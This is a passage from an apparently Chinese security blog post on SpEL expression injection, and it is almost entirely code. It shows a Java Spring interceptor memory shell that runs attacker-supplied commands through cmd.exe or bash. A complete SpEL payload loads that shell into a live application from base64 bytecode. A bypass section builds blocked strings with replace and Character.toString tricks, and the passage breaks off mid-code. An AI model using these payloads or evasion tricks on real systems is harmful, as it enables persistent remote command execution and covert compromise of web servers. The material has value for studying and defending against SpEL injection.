punctuation">&#123;</span><span class="token string">"cmd.exe"</span><span class="token punctuation">,</span> <span class="token string">"/c"</span><span class="token punctuation">,</span> cmd<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> cmd<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Scanner</span> c <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Scanner</span><span class="token punctuation">(</span>builder<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"gbk"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">useDelimiter</span><span class="token punctuation">(</span><span class="token string">"wocaosinidema"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                o <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> c<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> o<span class="token punctuation">;</span>                c<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                printWriter<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>                printWriter<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                printWriter<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">postHandle</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">Object</span> handler<span class="token punctuation">,</span> <span class="token class-name">ModelAndView</span> modelAndView<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">HandlerInterceptor</span><span class="token punctuation">.</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">postHandle</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">,</span> handler<span class="token punctuation">,</span> modelAndView<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">afterCompletion</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">Object</span> handler<span class="token punctuation">,</span> <span class="token class-name">Exception</span> ex<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">HandlerInterceptor</span><span class="token punctuation">.</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">afterCompletion</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">,</span> handler<span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么最终的payload：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">payload<span class="token operator">=</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>cglib<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span>ReflectUtils</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">defineClass</span><span class="token punctuation">(</span>'<span class="token class-name">InceptorMemShell</span>'<span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Base64Utils</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decodeFromString</span><span class="token punctuation">(</span>'yv66vgAAADQBAQoAOwCLCABWCwCMAI0IAI4LAI8AkAsAjwCRCACSCACTCgCUAJUKAA4AlggAlwoADgCYBwCZBwCaCACbCACcCgANAJ0IAJ4IAJ8HAKAKAA0AoQoAogCjCgAUAKQIAKUKABQApgoAFACnCgAUAKgKABQAqQoAqgCrCgCqAKwKAKoAqQcArQoAIACuCwA8AK8LADwAsAkAlACxCACyCgCzAKsKALQAtQgAtgsAtwC4BwC5BwC6CwAqALsHALwIAL0KAL4AvwcAwAoAMACuCgDBAMIKAMEAwwcAxAcAxQoANQCuBwDGCgA3AIsLADQAxwgAyAcAyQcAygEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQASTEluY2VwdG9yTWVtU2hlbGw7AQAJcHJlSGFuZGxlAQBkKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDspWgEAB2J1aWxkZXIBABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEAC3ByaW50V3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQABbwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAWMBABNMamF2YS91dGlsL1NjYW5uZXI7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdoYW5kbGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQADY21kAQANU3RhY2tNYXBUYWJsZQcAxgcAywcAzAcAzQcAmgcAzgcAmQcAoAcArQEACkV4Y2VwdGlvbnMBABBNZXRob2RQYXJhbWV0ZXJzAQAKcG9zdEhhbmRsZQEAkihMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvTW9kZWxBbmRWaWV3OylWAQAMbW9kZWxBbmRWaWV3AQAuTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvTW9kZWxBbmRWaWV3OwEAD2FmdGVyQ29tcGxldGlvbgEAeShMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9FeGNlcHRpb247KVYBAAJleAEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAM8BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BACBMamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uOwEAIkxqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbjsBAAdjb250ZXh0AQA3TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0OwEAFW1hcHBpbmdIYW5kbGVyTWFwcGluZwEAVExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nOwEABWZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAEWFkYXB0SW50ZXJjZXB0b3JzAQAQTGphdmEvdXRpbC9MaXN0OwEAD2V2aWxJbnRlcmNlcHRvcgEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBAEZMamF2YS91dGlsL0xpc3Q8TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvSGFuZGxlckludGVyY2VwdG9yOz47BwC5BwC6BwDQBwDABwDEBwDFAQAKU291cmNlRmlsZQEAFUluY2VwdG9yTWVtU2hlbGwuamF2YQwAPQA<span class="token operator">+</span><span class="token class-name">BwDLDADRANIBAANnYmsHAMwMANMA1AwA1QDWAQAAAQAHb3MubmFtZQcA1wwA2ADSDADZANoBAAN3aW4MANsA3AEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMAD0A3QEACS9iaW4vYmFzaAEAAi1jAQARamF2YS91dGlsL1NjYW5uZXIMAN4A3wcA4AwA4QDiDAA9AOMBAA13b2Nhb3NpbmlkZW1hDADkAOUMAOYA5wwA6ADaDADpAD4HAM4MAOoA1AwA6wA</span><span class="token operator">+</span><span class="token class-name">AQATamF2YS9sYW5nL0V4Y2VwdGlvbgwA7AA</span><span class="token operator">+</span><span class="token class-name">DABjAGQMAGcAaAwA7QDuAQAGc3RhYXJ0BwDvBwDwDADxAPIBADlvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5zZXJ2bGV0LkRpc3BhdGNoZXJTZXJ2bGV0LkNPTlRFWFQHAPMMAPQA9QEANW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0AQBSb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL2Fubm90YXRpb24vUmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwwA9gD3AQA</span><span class="token operator">+</span>b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9oYW5kbGVyL0Fic3RyYWN0SGFuZGxlck1hcHBpbmcBABNhZGFwdGVkSW50ZXJjZXB0b3JzBwD4DAD5APoBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24HANAMAPsA<span class="token operator">/</span><span class="token class-name">AwA</span><span class="token operator">/</span><span class="token constant">QD</span><span class="token operator">+</span><span class="token class-name">AQAOamF2YS91dGlsL0xpc3QBACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbgEAEEluY2VwdG9yTWVtU2hlbGwMAP8BAAEAAm9rAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAMm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvSGFuZGxlckludGVyY2VwdG9yAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvaW8vUHJpbnRXcml0ZXIBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAUc2V0Q2hhcmFjdGVyRW5jb2RpbmcBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAKihMamF2YS9pby9JbnB1dFN0cmVhbTtMamF2YS9sYW5nL1N0cmluZzspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAdwcmludGxuAQAFZmx1c2gBAA9wcmludFN0YWNrVHJhY2UBAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQA8b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RDb250ZXh0SG9sZGVyAQAYY3VycmVudFJlcXVlc3RBdHRyaWJ1dGVzAQA9KClMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzOwEAOW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlcwEADGdldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztJKUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldEJlYW4BACUoTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9PYmplY3Q7AQAPamF2YS9sYW5nL0NsYXNzAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAANhZGQBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoAIQA3ADsAAQA8AAAABwABAD0APgABAD8AAAAvAAEAAQAAAAUqtwABsQAAAAIAQAAAAAYAAQAAABIAQQAAAAwAAQAAAAUAQgBDAAAAAQBEAEUAAwA</span><span class="token operator">/</span><span class="token class-name">AAACBQAGAAkAAAC</span><span class="token operator">+</span><span class="token class-name">KxICuQADAgA6BBkExgCwLBIEuQAFAgAsuQAGAQA6BRIHOgcSCLgACbYAChILtgAMmQAiuwANWQa9AA5ZAxIPU1kEEhBTWQUZBFO3ABE6BqcAH7sADVkGvQAOWQMSElNZBBITU1kFGQRTtwAROga7ABRZGQa2ABW2ABYSBLcAFxIYtgAZOggZCLYAGpkACxkItgAbpwAFGQc6BxkItgAcGQUZB7YAHRkFtgAeGQW2AB</span><span class="token operator">+</span>nAAo6BRkFtgAhA6wErAABAA8AsACzACAAAwBAAAAATgATAAAALQAKAC4ADwAwABcAMQAfADMAIwA0ADMANQBSADcAbgA5AIYAOgCaADsAnwA8AKYAPQCrAD4AsABBALMAPwC1AEAAugBCALwARABBAAAAcAALAE8AAwBGAEcABgAfAJEASABJAAUAbgBCAEYARwAGACMAjQBKAEsABwCGACoATABNAAgAtQAFAE4ATwAFAAAAvgBCAEMAAAAAAL4AUABRAAEAAAC<span class="token operator">+</span><span class="token class-name">AFIAUwACAAAAvgBUAFUAAwAKALQAVgBLAAQAVwAAAGMAB</span><span class="token operator">/</span><span class="token number">8</span>AUgAIBwBYBwBZBwBaBwBbBwBcBwBdAAcAXAAA<span class="token operator">/</span>wAbAAgHAFgHAFkHAFoHAFsHAFwHAF0HAF4HAFwAAPwAJwcAX0EHAFz<span class="token operator">/</span><span class="token class-name">ABoABQcAWAcAWQcAWgcAWwcAXAABBwBgBgEAYQAAAAQAAQAgAGIAAAANAwBQAAAAUgAAAFQAAAABAGMAZAADAD8AAABgAAUABQAAAAoqKywtGQS3ACKxAAAAAgBAAAAACgACAAAASQAJAEoAQQAAADQABQAAAAoAQgBDAAAAAAAKAFAAUQABAAAACgBSAFMAAgAAAAoAVABVAAMAAAAKAGUAZgAEAGEAAAAEAAEAIABiAAAAEQQAUAAAAFIAAABUAAAAZQAAAAEAZwBoAAMAPwAAAGAABQAFAAAACiorLC0ZBLcAI7EAAAACAEAAAAAKAAIAAABOAAkATwBBAAAANAAFAAAACgBCAEMAAAAAAAoAUABRAAEAAAAKAFIAUwACAAAACgBUAFUAAwAAAAoAaQBPAAQAYQAAAAQAAQAgAGIAAAARBABQAAAAUgAAAFQAAABpAAAAAQBqAGsAAwA</span><span class="token operator">/</span><span class="token class-name">AAAAPwAAAAMAAAABsQAAAAIAQAAAAAYAAQAAAFQAQQAAACAAAwAAAAEAQgBDAAAAAAABAGwAbQABAAAAAQBuAG8AAgBhAAAABAABAHAAYgAAAAkCAGwAAABuAAAAAQBqAHEAAwA</span><span class="token operator">/</span><span class="token class-name">AAAASQAAAAQAAAABsQAAAAIAQAAAAAYAAQAAAFkAQQAAACoABAAAAAEAQgBDAAAAAAABAGwAbQABAAAAAQByAHMAAgAAAAEAVAB0AAMAYQAAAAQAAQBwAGIAAAANAwBsAAAAcgAAAFQAAAAIAHUAPgABAD8AAAFpAAMABQAAAGqyACQSJbYAJrgAJxIoA7kAKQMAwAAqSyoSK7kALAIAwAArTAFNEi0SLrYAL02nAAhOLbYAMSwEtgAyAU4sK7YAM8AANE6nAAo6BBkEtgA2uwA3WbcAODoELRkEuQA5AgBXsgAkEjq2ACaxAAIAJQAtADAAMAA8AEUASAA1AAQAQAAAAEoAEgAAABUACAAWABcAFwAjABgAJQAaAC0AHQAwABsAMQAcADUAHgA6AB8APAAhAEUAJABIACIASgAjAE8AJQBYACYAYQAnAGkAKABBAAAASAAHADEABABOAHYAAwBKAAUATgB3AAQAFwBSAHgAeQAAACMARgB6AHsAAQAlAEQAfAB9AAIAPAAtAH4AfwADAFgAEQCAAEMABACBAAAADAABADwALQB</span><span class="token operator">+</span><span class="token class-name">AIIAAwBXAAAALQAE</span><span class="token operator">/</span>wAwAAMHAIMHAIQHAIUAAQcAhgT<span class="token operator">/</span><span class="token class-name">ABIABAcAgwcAhAcAhQcAhwABBwCIBgABAIkAAAACAIo</span><span class="token operator">=</span>'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Thread</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/19/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20240719225734878.png" alt="image-20240719225734878"></p><hr><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="字符串替换"><a href="#字符串替换" class="headerlink" title="字符串替换"></a>字符串替换</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>T(String).getName</code>返回的是<code>java.lang.String</code>，然后用replace替换获取想要的字符串，这种比较麻烦。</p><p>还有一种就是直接使用类似<code>chr</code>函数</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">51</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">122</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">49</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="外部对象request"><a href="#外部对象request" class="headerlink" title="外部对象request"></a>外部对象request</h3><p>假如上下文中有request对象的话就也有几种方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//request.getMethod()为POST</span>#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>b#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>b#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>b#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token 